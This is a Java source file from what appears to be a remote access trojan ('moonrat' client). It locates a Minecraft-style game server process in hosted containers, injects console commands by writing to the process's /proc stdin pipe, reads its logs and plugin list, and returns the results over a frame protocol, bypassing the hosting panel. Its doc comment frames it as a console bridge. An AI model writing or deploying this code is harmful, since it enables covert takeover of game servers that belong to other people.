package moonrat.client.tasks;

import java.io.IOException;
import java.io.RandomAccessFile;
import java.nio.charset.StandardCharsets;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import moonrat.Protocol;
import moonrat.Protocol.Frame;

/**
 * Game server console bridge for headless / Pterodactyl containers.
 *
 * Commands are delivered by writing to /proc/<pid>/fd/0 — the stdin pipe the
 * hosting daemon (wings) attached to the game server, so console input works
 * without owning the tty. Output is read from logs/latest.log so nothing is
 * stolen from the panel console feed.
 */
public final class GameTasks {
    private static final long DEFAULT_LOG_BYTES = 32768;

    private GameTasks() {}

    public static Frame handle(String action, String argument) {
        if ("send".equals(action)) return send(argument);
        if ("log".equals(action)) return log(argument);
        return info();
    }

    public static Frame info() {
        Frame response = new Frame(Protocol.GAME_RESP);
        try {
            requireLinux();
            ProcessHandle server = findServer();
            if (server == null) throw new IOException("no game server process found");
            Path dir = requireDir(server.pid());

            List<String> plugins = new ArrayList<>();
            Path pluginsDir = dir.resolve("plugins");
            if (Files.isDirectory(pluginsDir)) {
                try (DirectoryStream<Path> entries = Files.newDirectoryStream(pluginsDir, "*.jar")) {
                    for (Path jar : entries) plugins.add(jar.getFileName().toString());
                }
            }
            Collections.sort(plugins);

            response.fields = new ArrayList<>(List.of("",
                    String.valueOf(server.pid()),
                    dir.toString(),
                    String.join(",", plugins)));
        } catch (Exception failure) {
            response.fields = new ArrayList<>(List.of(message(failure)));
        }
        return response;
    }

    public static Frame send(String command) {
        Frame response = new Frame(Protocol.GAME_RESP);
        try {
            requireLinux();
            if (command == null || command.isBlank()) throw new IOException("empty command");

            ProcessHandle server = findServer();
            if (server == null) throw new IOException("no game server process found");

            Path stdin = Paths.get("/proc", Long.toString(server.pid()), "fd", "0");
            Files.write(stdin, (command + "\n").getBytes(StandardCharsets.UTF_8), StandardOpenOption.WRITE);
            response.fields = new ArrayList<>(List.of(""));
        } catch (Exception failure) {
            response.fields = new ArrayList<>(List.of(message(failure)));
        }
        return response;
    }

    public static Frame log(String maxBytes) {
        Frame response = new Frame(Protocol.GAME_RESP);
        try {
            requireLinux();
            ProcessHandle server = findServer();
            if (server == null) throw new IOException("no game server process found");
            Path dir = requireDir(server.pid());

            Path logFile = newestLog(dir);
            long limit = parseLong(maxBytes, DEFAULT_LOG_BYTES);
            long size = Files.size(logFile);
            long start = Math.max(0, size - limit);

            byte[] chunk;
            try (RandomAccessFile file = new RandomAccessFile(logFile.toFile(), "r")) {
                file.seek(start);
                chunk = new byte[(int) (size - start)];
                file.readFully(chunk);
            }

            response.fields = new ArrayList<>(List.of(""));
            response.blob = chunk;
        } catch (Exception failure) {
            response.fields = new ArrayList<>(List.of(message(failure)));
        }
        return response;
    }

    private static ProcessHandle findServer() {
        long self = ProcessHandle.current().pid();
        return ProcessHandle.allProcesses()
                .filter(process -> process.pid() != self)
                .filter(GameTasks::isGameProcess)
                .findFirst()
                .orElse(null);
    }

    private static boolean isGameProcess(ProcessHandle process) {
        String command = process.info().command().orElse("");
        String arguments = process.info().arguments().map(args -> String.join(" ", args)).orElse("");
        String full = (command + " " + arguments).toLowerCase();
        boolean javaLike = full.contains("java") || full.contains(".jar");
        if (!javaLike) return false;

        Path dir = workingDir(process.pid());
        return dir != null && isGameDir(dir);
    }

    private static boolean isGameDir(Path dir) {
        return Files.isRegularFile(dir.resolve("eula.txt"))
                || Files.isRegularFile(dir.resolve("server.properties"))
                || Files.isRegularFile(dir.resolve("velocity.toml"))
                || Files.isRegularFile(dir.resolve("config").resolve("paper-global.yml"))
                || Files.isDirectory(dir.resolve("plugins"));
    }

    private static Path workingDir(long pid) {
        try {
            return Files.readSymbolicLink(Paths.get("/proc", Long.toString(pid), "cwd"));
        } catch (Exception failure) {
            return null;
        }
    }

    private static Path requireDir(long pid) throws IOException {
        Path dir = workingDir(pid);
        if (dir == null) throw new IOException("cannot resolve server directory");
        return dir;
    }

    private static Path newestLog(Path dir) throws IOException {
        Path latest = dir.resolve("logs").resolve("latest.log");
        if (Files.isRegularFile(latest)) return latest;

        Path logs = dir.resolve("logs");
        if (Files.isDirectory(logs)) {
            Path newest = null;
            try (DirectoryStream<Path> entries = Files.newDirectoryStream(logs, "*.log")) {
                for (Path entry : entries) {
                    if (newest == null || lastModified(entry) > lastModified(newest)) newest = entry;
                }
            }
            if (newest != null) return newest;
        }
        throw new IOException("no log file under " + dir);
    }

    private static long lastModified(Path path) {
        try {
            return Files.getLastModifiedTime(path).toMillis();
        } catch (Exception failure) {
            return 0;
        }
    }

    private static void requireLinux() throws IOException {
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            throw new IOException("game console is linux-only");
        }
    }

    private static long parseLong(String value, long fallback) {
        try {
            return Long.parseLong(value);
        } catch (Exception failure) {
            return fallback;
        }
    }

    private static String message(Exception failure) {
        return failure.getMessage() == null ? String.valueOf(failure) : failure.getMessage();
    }
}
